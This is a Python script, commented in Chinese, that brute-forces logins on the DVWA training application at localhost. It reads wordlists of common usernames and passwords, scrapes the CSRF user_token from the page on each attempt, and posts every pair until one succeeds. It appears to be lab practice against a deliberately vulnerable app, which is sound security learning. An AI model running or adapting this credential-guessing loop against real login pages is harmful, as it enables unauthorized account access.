# coding: utf-8
import re
import requests
import urllib.request
import string
from urllib.parse import quote

url = 'http://localhost:9096/dvwa/vulnerabilities/brute/'
header = {
    #'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',        #爬虫爬网站的时候，要加上User-Agent
    #'Referer': 'http://localhost:9096/dvwa/login.php',
    'Cookie': 'security=impossible; Hm_lvt_24b77a56c77ce27d009359b331cde12e=1566919595; userNewsPort0=1; Hm_lvt_080dabacb001ad3dc8b9b9049b36d43b=1566919602; Wa_lvt_1=1566919602; IC86_2132_saltkey=vrVVopPr; IC86_2132_lastvisit=1567337721; IC86_2132_ulastactivity=398ai0%2B3UKPMvdASat0joCCqv1pttQy29Vqu3kc1jWp8XcnvC4vg; IC86_2132_lastcheckfeed=2%7C1567341332; IC86_2132_nofavfid=1; '
              'PHPSESSID=2i94aah23nflab3e2cmtl6deu1'            #登陆网站一般有会话控制，这里需要添加会话ID
}
file = open('E:\Blasting_dictionary-master\常用用户名.txt', 'r')         #爆破字典的路径，注意，字典的编码格式最好是utf-8
usernames = file.readlines()
file = open('E:\Blasting_dictionary-master\常用密码.txt', 'r')
passwords = file.readlines()


for username in usernames:
    username = username.strip('\n')
    for password in passwords:
        password = password.strip('\n')
        '''
        #下面3步获取登陆页面内容
        #下面是GET方法，用urllib.request库
        request = urllib.request.Request(url, headers=header)
        response = urllib.request.urlopen(request)
        content = response.read().decode('utf-8')
        #登陆请求提交时，往往会附带CSRF Token（这里名字叫user_token）值，而这些值是在HTTP请求登陆页面时，由后台生成并随HTTP响应附加在登陆页面里的
        user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", content)[0]
        url_param = quote(url+'?username='+str(username)+'&password='+str(password)+'&Login=Login&user_token='+user_token, safe=string.printable)       #url编码
        #url附加了用户名、密码和user_token后，就可以发送登陆请求，根据响应来确认爆破结果了
        request2 = urllib.request.Request(url_param, headers=header)
        response2 = urllib.request.urlopen(request2)
        content2 = response2.read().decode('utf-8')
        '''
        #下面是POST方法，这里使用requests库
        response1 = requests.request('GET', url)        #这里仅是请求初始页面，最好根据抓包结果的请求方式来选择GET或者POST
        content1 = response1.text
        user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", content1)[0]
        postdata = {'username': username, 'password': password, 'Login':'Login', 'user_token': user_token}
        response2 = requests.post(url=url,data=postdata,headers=header)
        content2 = response2.text

        #确认破解结果,格式化输出
        print('-'*20)
        print("用户名： %s" % username)
        print("密码： %s" % password)
        if "Username and/or password incorrect." in content2:
            print("失败")
        else:
            print("成功！！！")
            print('-' * 20)
            exit()
        print('-'*20)